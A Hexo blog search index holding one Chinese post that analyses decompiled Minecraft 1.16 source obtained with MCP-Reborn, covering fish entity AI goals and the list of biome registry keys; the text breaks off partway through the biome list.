<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MineCraft源码分析(一)</title>
      <link href="/post/e2190ec0.html"/>
      <url>/post/e2190ec0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>MineCraft是一款沙盒式建造游戏，缔造者为Mojang Studios创始人马库斯·佩尔松，其灵感源于《无尽矿工》､《矮人要塞》和《地下城守护者》。现首席创意官为延斯·伯根斯坦，首席开发者为昂内丝·拉尔森。玩家可以在游戏中的三维空间里创造和破坏林林总总的方块，甚至在多人服务器与单人世界中体验不同的游戏模式，打造精美的建筑物，创造物和艺术品。且Minecraft的游戏平台已囊括了移动设备和游戏主机。<br>相信很多人都在自己的童年游戏生涯中接触到过MC。对我来说，MC更像是一种回忆，承载起了众多与玩伴们在方块的世界中冒险与生活的温馨记忆。大学以来，我先后尝试了在游戏中实现基于红石体系的复杂电路系统，热衷于寻找游戏中隐含的机制与特性，并基于我所掌握的软件工程知识进行相应的解读。如今，我终于有机会和能力进行MC源代码的阅读，我希望能够通过这样的经历提高我的软件编码水平和阅读能力，进一步加深对Java语言的理解和应用，同时能够记录成文为后来的探索者们提供建议、指明方向。</p><h1 id="MineCraft源代码的获取"><a href="#MineCraft源代码的获取" class="headerlink" title="MineCraft源代码的获取"></a>MineCraft源代码的获取</h1><p>首先，根据官方MineCraft开发小组的说法，他们将会持续开放部分MineCraft的源代码供玩家制作Mod，提升游戏的Java引擎与制作自己的游戏项目。但是就目前来看，他们并没有完成完整的源代码的公布，不过这并不妨碍部分爱好者进行对MC源代码的初步了解。<br><a href="https://github.com/Mojang/brigadier" target="_blank" rel="noopener">https://github.com/Mojang/brigadier</a> <code>官方源代码公布地址</code></p><p>其次，由<a href="http://www.modcoderpack.com" target="_blank" rel="noopener">www.modcoderpack.com</a> 给出了另一种解包MC的方法。目前网页上提供了MCP940、937、931、928、918、908的6个对应不同版本的包。下载之后按照文件中记录操作即可。不过最高支持的MC的版本停留在1.12，无法对最新MC的源码和特性进行分析。<br><a href="http://www.modcoderpack.com/website/content/mcp-910" target="_blank" rel="noopener">http://www.modcoderpack.com/website/content/mcp-910</a> <code>MCP-Packages</code></p><p>如上两种方法都不能让我们拿到较为满意的代码，于是我选择通过MCP-Reborn项目进行对MC源代码的获取。值得注意的是，MC将自己的源码做了混淆处理之后才打包成为jar包，因此MCP架构下的反推只能说是得到一些可以运行的无限接近MC源码的代码，可能与真·MC源代码有出入。</p><h1 id="IDEA引入MCP-Reborn-1-16"><a href="#IDEA引入MCP-Reborn-1-16" class="headerlink" title="IDEA引入MCP-Reborn-1.16"></a>IDEA引入MCP-Reborn-1.16</h1><p><code>⚠️ WARNING ⚠️: You CANNOT publish any code generated by this tool.</code><br><code>注意：开发者禁止任何人发布基于本框架生成的任何代码！</code></p><p>首先解压缩文件，将其导入IDEA中，项目会自行完成MCP的构建。在运行过程中会遇到某文件无法下载的问题，通常，将你的网络切换为外网即可解决问题。初次架构会耗费较长的时间，请确保架构成功之后(无Error)再进入下一步的操作。<br>构建完毕后打开右侧Gradle，找到mcp-reborn-&gt;Tasks-&gt;mcp-&gt;setup，双击运行，开始反编译。<br>反编译完成后即可在左侧Project-&gt;MCP-Reborn-&gt;src中找到源码。<br>如需运行Minecraft可在src-&gt;main-&gt;java-&gt;mcp-&gt;client-&gt;start中运行类Start（public class Start）。<br>此外，在更改源代码之后需要进行的测试，打包方法，请参考:<a href="https://github.com/Hexeption/MCP-Reborn" target="_blank" rel="noopener">https://github.com/Hexeption/MCP-Reborn</a> 中Readme文档的说明，本文不作探讨。<br><em>项目Github地址</em>：<a href="https://github.com/Hexeption/MCP-Reborn" target="_blank" rel="noopener">https://github.com/Hexeption/MCP-Reborn</a></p><h1 id="AbstractFishEntity-——-以鱼类抽象实体类为例介绍Entity类别"><a href="#AbstractFishEntity-——-以鱼类抽象实体类为例介绍Entity类别" class="headerlink" title="AbstractFishEntity —— 以鱼类抽象实体类为例介绍Entity类别"></a>AbstractFishEntity —— 以鱼类抽象实体类为例介绍Entity类别</h1><p>首先我们进入entity包中passive-&gt;fish类，找到声明鱼类实体的AbstractFishEntity类。<br>我们发现，他首先进行了对鱼型实体的初始化以及部分动作的声明和定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">protected float getStandingEyeHeight(Pose poseIn, EntitySize sizeIn) &#123;</span><br><span class="line">      return sizeIn.height * 0.65F;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">public static AttributeModifierMap.MutableAttribute func_234176_m_() &#123;</span><br><span class="line">    return MobEntity.func_233666_p_().createMutableAttribute(Attributes.MAX_HEALTH, 3.0D);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public boolean preventDespawn() &#123;</span><br><span class="line">    return super.preventDespawn() || this.isFromBucket();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static boolean func_223363_b(EntityType&lt;? extends AbstractFishEntity&gt; type, IWorld worldIn, SpawnReason reason, BlockPos p_223363_3_, Random randomIn) &#123;</span><br><span class="line">      return worldIn.getBlockState(p_223363_3_).isIn(Blocks.WATER) &amp;&amp; worldIn.getBlockState(p_223363_3_.up()).isIn(Blocks.WATER);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">public boolean canDespawn(double distanceToClosestPlayer) &#123;</span><br><span class="line">    return !this.isFromBucket() &amp;&amp; !this.hasCustomName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public int getMaxSpawnedInChunk() &#123;</span><br><span class="line">    return 8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected void registerData() &#123;</span><br><span class="line">      super.registerData();</span><br><span class="line">      this.dataManager.register(FROM_BUCKET, false);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>如上，定义了获取实体视角高度(StandingEyeHeight)的函数，定义了它允许消失与否的判定条件，实体是否位于特定Block中的判定(isIn(Blocks.WATER))，以及其最大的生成块数据,最后将其注册进保存实体的数据集中。<br>接下来，开始对实体参数的设定与判断：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">protected void registerGoals() &#123;</span><br><span class="line">      super.registerGoals();</span><br><span class="line">      this.goalSelector.addGoal(0, new PanicGoal(this, 1.25D));</span><br><span class="line">      this.goalSelector.addGoal(2, new AvoidEntityGoal&lt;&gt;(this, PlayerEntity.class, 8.0F, 1.6D, 1.4D, EntityPredicates.NOT_SPECTATING::test));</span><br><span class="line">      this.goalSelector.addGoal(4, new AbstractFishEntity.SwimGoal(this));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   protected PathNavigator createNavigator(World worldIn) &#123;</span><br><span class="line">      return new SwimmerPathNavigator(this, worldIn);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public void travel(Vector3d travelVector) &#123;</span><br><span class="line">      if (this.isServerWorld() &amp;&amp; this.isInWater()) &#123;</span><br><span class="line">         this.moveRelative(0.01F, travelVector);</span><br><span class="line">         this.move(MoverType.SELF, this.getMotion());</span><br><span class="line">         this.setMotion(this.getMotion().scale(0.9D));</span><br><span class="line">         if (this.getAttackTarget() &#x3D;&#x3D; null) &#123;</span><br><span class="line">            this.setMotion(this.getMotion().add(0.0D, -0.005D, 0.0D));</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         super.travel(travelVector);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>接下来是为鱼类实体进行Goal的注册，通过addGoal函数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void addGoal(int priority, Goal task) &#123;</span><br><span class="line">      this.goals.add(new PrioritizedGoal(priority, task));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>注册实体的Goal信息<br>函数中包含两个值，分别是Goal的优先级与Goal的目标函数<br>对鱼类实体而言，需要添加的Goal有Panic、AvoidEntityGoal、SwimGoal三种，</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public PanicGoal(CreatureEntity creature, double speedIn) &#123;</span><br><span class="line">      this.creature &#x3D; creature;</span><br><span class="line">      this.speed &#x3D; speedIn;</span><br><span class="line">      this.setMutexFlags(EnumSet.of(Goal.Flag.MOVE));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">public boolean shouldExecute()&#123;…&#125;</span><br><span class="line">protected boolean findRandomPosition()&#123;…&#125;</span><br><span class="line">public boolean isRunning()&#123;…&#125;</span><br><span class="line">public void startExecuting()&#123;…&#125;</span><br><span class="line">public void resetTask()&#123;…&#125;</span><br><span class="line">public boolean shouldContinueExecuting()&#123;…&#125;</span><br><span class="line">protected BlockPos getRandPos(IBlockReader worldIn, Entity entityIn, int horizontalRange, int verticalRange)&#123;…&#125;</span><br></pre></td></tr></table></figure></div><p>Panic_Goal主要用于判定该实体对于敌对生物接近等产生的恐慌进行反应，在鱼类实体中具有最高的优先级0</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public AvoidEntityGoal(CreatureEntity entityIn, Class&lt;T&gt; classToAvoidIn, float avoidDistanceIn, double farSpeedIn, double nearSpeedIn)&#123;…&#125;</span><br><span class="line">public AvoidEntityGoal(CreatureEntity entityIn, Class&lt;T&gt; avoidClass, Predicate&lt;LivingEntity&gt; targetPredicate, float distance, double nearSpeedIn, double farSpeedIn, Predicate&lt;LivingEntity&gt; p_i48859_9_)&#123;…&#125;</span><br><span class="line">public AvoidEntityGoal(CreatureEntity entityIn, Class&lt;T&gt; avoidClass, float distance, double nearSpeedIn, double farSpeedIn, Predicate&lt;LivingEntity&gt; targetPredicate)&#123;…&#125;</span><br><span class="line">public boolean shouldExecute()&#123;…&#125;</span><br><span class="line"></span><br><span class="line">public boolean shouldContinueExecuting() &#123;</span><br><span class="line">      return !this.navigation.noPath();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">public void startExecuting() &#123;</span><br><span class="line">    this.navigation.setPath(this.path, this.farSpeed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void resetTask() &#123;</span><br><span class="line">    this.avoidTarget &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line">public void tick()</span><br></pre></td></tr></table></figure></div><p>AvoidEntityGoal函数提供实体用于躲避其他实体所需的向量计算，它的优先级为2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static class SwimGoal extends RandomSwimmingGoal &#123;</span><br><span class="line">      private final AbstractFishEntity fish;</span><br><span class="line"></span><br><span class="line">      public SwimGoal(AbstractFishEntity fish) &#123;</span><br><span class="line">         super(fish, 1.0D, 40);</span><br><span class="line">         this.fish &#x3D; fish;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      public boolean shouldExecute() &#123;</span><br><span class="line">         return this.fish.func_212800_dy() &amp;&amp; super.shouldExecute();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>最后是从RandomSwimmingGoal中衍生出的SwimGoal，他被封装在鱼类实体类中，用于控制鱼的移动</p><p>此外，我们还注意到，鱼的实体类还调用了数个与声音相关的函数匹配其移动时所产生的声音输出</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">protected abstract SoundEvent getFlopSound();</span><br><span class="line"></span><br><span class="line">protected SoundEvent getSwimSound() &#123;</span><br><span class="line">   return SoundEvents.ENTITY_FISH_SWIM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected void playStepSound(BlockPos pos, BlockState blockIn) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过如上的分析我们已经初步了解了MC中对于不同实体类所采用的相同的编写方式，但是其他的生物实体可能远复杂于鱼类实体。例如，在马类实体中，用于注册的Goals增加到了7个，分为6个不同的优先级，控制了实体惊恐状态、四处奔跑状态、交配状态、跟随父母状态、规避水地形状态、凝视状态、随机朝向状态的动作。而且还有更多的函数用于控制其是否带有箱子、是否为驯服状态、与牵引绳的交互状态、吃草、饲养、心情与繁殖的状态等，同时也有相应的声音调度方法。</p><p>我们还可以注意到，对实体类进行编写时，MC对一类动作相似的的生物进行了归纳，并从该基类衍生出不同的个体类，这大大减少了代码量，但是却显著增大了代码的耦合性，对基类进行修改的时候还可能产生涟漪效应。此外，在实体类中还出现了诸如func_223363_b()、0.65F等的不规范函数命名与魔术值，增大了代码的阅读难度，让可维护性下降。</p><h1 id="从Biome包开始分析MC地形生成相关逻辑"><a href="#从Biome包开始分析MC地形生成相关逻辑" class="headerlink" title="从Biome包开始分析MC地形生成相关逻辑"></a>从Biome包开始分析MC地形生成相关逻辑</h1><p>首先我们从Biomes的定义开始说起。<br>在world-&gt;bimoe-&gt;provider-&gt;Biomes.java中，定义了MC中所有可能生成的生物群系</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static final RegistryKey&lt;Biome&gt; OCEAN &#x3D; makeKey(&quot;ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; PLAINS &#x3D; makeKey(&quot;plains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DESERT &#x3D; makeKey(&quot;desert&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MOUNTAINS &#x3D; makeKey(&quot;mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; FOREST &#x3D; makeKey(&quot;forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; TAIGA &#x3D; makeKey(&quot;taiga&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SWAMP &#x3D; makeKey(&quot;swamp&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; RIVER &#x3D; makeKey(&quot;river&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; NETHER_WASTES &#x3D; makeKey(&quot;nether_wastes&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; THE_END &#x3D; makeKey(&quot;the_end&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; FROZEN_OCEAN &#x3D; makeKey(&quot;frozen_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; FROZEN_RIVER &#x3D; makeKey(&quot;frozen_river&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_TUNDRA &#x3D; makeKey(&quot;snowy_tundra&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_MOUNTAINS &#x3D; makeKey(&quot;snowy_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MUSHROOM_FIELDS &#x3D; makeKey(&quot;mushroom_fields&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MUSHROOM_FIELD_SHORE &#x3D; makeKey(&quot;mushroom_field_shore&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BEACH &#x3D; makeKey(&quot;beach&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DESERT_HILLS &#x3D; makeKey(&quot;desert_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; WOODED_HILLS &#x3D; makeKey(&quot;wooded_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; TAIGA_HILLS &#x3D; makeKey(&quot;taiga_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MOUNTAIN_EDGE &#x3D; makeKey(&quot;mountain_edge&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; JUNGLE &#x3D; makeKey(&quot;jungle&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; JUNGLE_HILLS &#x3D; makeKey(&quot;jungle_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; JUNGLE_EDGE &#x3D; makeKey(&quot;jungle_edge&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DEEP_OCEAN &#x3D; makeKey(&quot;deep_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; STONE_SHORE &#x3D; makeKey(&quot;stone_shore&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_BEACH &#x3D; makeKey(&quot;snowy_beach&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BIRCH_FOREST &#x3D; makeKey(&quot;birch_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BIRCH_FOREST_HILLS &#x3D; makeKey(&quot;birch_forest_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DARK_FOREST &#x3D; makeKey(&quot;dark_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_TAIGA &#x3D; makeKey(&quot;snowy_taiga&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_TAIGA_HILLS &#x3D; makeKey(&quot;snowy_taiga_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; GIANT_TREE_TAIGA &#x3D; makeKey(&quot;giant_tree_taiga&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; GIANT_TREE_TAIGA_HILLS &#x3D; makeKey(&quot;giant_tree_taiga_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; WOODED_MOUNTAINS &#x3D; makeKey(&quot;wooded_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SAVANNA &#x3D; makeKey(&quot;savanna&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SAVANNA_PLATEAU &#x3D; makeKey(&quot;savanna_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BADLANDS &#x3D; makeKey(&quot;badlands&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; WOODED_BADLANDS_PLATEAU &#x3D; makeKey(&quot;wooded_badlands_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BADLANDS_PLATEAU &#x3D; makeKey(&quot;badlands_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SMALL_END_ISLANDS &#x3D; makeKey(&quot;small_end_islands&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; END_MIDLANDS &#x3D; makeKey(&quot;end_midlands&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; END_HIGHLANDS &#x3D; makeKey(&quot;end_highlands&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; END_BARRENS &#x3D; makeKey(&quot;end_barrens&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; WARM_OCEAN &#x3D; makeKey(&quot;warm_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; LUKEWARM_OCEAN &#x3D; makeKey(&quot;lukewarm_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; COLD_OCEAN &#x3D; makeKey(&quot;cold_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DEEP_WARM_OCEAN &#x3D; makeKey(&quot;deep_warm_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DEEP_LUKEWARM_OCEAN &#x3D; makeKey(&quot;deep_lukewarm_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DEEP_COLD_OCEAN &#x3D; makeKey(&quot;deep_cold_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DEEP_FROZEN_OCEAN &#x3D; makeKey(&quot;deep_frozen_ocean&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; THE_VOID &#x3D; makeKey(&quot;the_void&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SUNFLOWER_PLAINS &#x3D; makeKey(&quot;sunflower_plains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DESERT_LAKES &#x3D; makeKey(&quot;desert_lakes&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; GRAVELLY_MOUNTAINS &#x3D; makeKey(&quot;gravelly_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; FLOWER_FOREST &#x3D; makeKey(&quot;flower_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; TAIGA_MOUNTAINS &#x3D; makeKey(&quot;taiga_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SWAMP_HILLS &#x3D; makeKey(&quot;swamp_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; ICE_SPIKES &#x3D; makeKey(&quot;ice_spikes&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MODIFIED_JUNGLE &#x3D; makeKey(&quot;modified_jungle&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MODIFIED_JUNGLE_EDGE &#x3D; makeKey(&quot;modified_jungle_edge&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; TALL_BIRCH_FOREST &#x3D; makeKey(&quot;tall_birch_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; TALL_BIRCH_HILLS &#x3D; makeKey(&quot;tall_birch_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; DARK_FOREST_HILLS &#x3D; makeKey(&quot;dark_forest_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SNOWY_TAIGA_MOUNTAINS &#x3D; makeKey(&quot;snowy_taiga_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; GIANT_SPRUCE_TAIGA &#x3D; makeKey(&quot;giant_spruce_taiga&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; GIANT_SPRUCE_TAIGA_HILLS &#x3D; makeKey(&quot;giant_spruce_taiga_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MODIFIED_GRAVELLY_MOUNTAINS &#x3D; makeKey(&quot;modified_gravelly_mountains&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SHATTERED_SAVANNA &#x3D; makeKey(&quot;shattered_savanna&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SHATTERED_SAVANNA_PLATEAU &#x3D; makeKey(&quot;shattered_savanna_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; ERODED_BADLANDS &#x3D; makeKey(&quot;eroded_badlands&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MODIFIED_WOODED_BADLANDS_PLATEAU &#x3D; makeKey(&quot;modified_wooded_badlands_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; MODIFIED_BADLANDS_PLATEAU &#x3D; makeKey(&quot;modified_badlands_plateau&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BAMBOO_JUNGLE &#x3D; makeKey(&quot;bamboo_jungle&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BAMBOO_JUNGLE_HILLS &#x3D; makeKey(&quot;bamboo_jungle_hills&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; SOUL_SAND_VALLEY &#x3D; makeKey(&quot;soul_sand_valley&quot;);</span><br><span 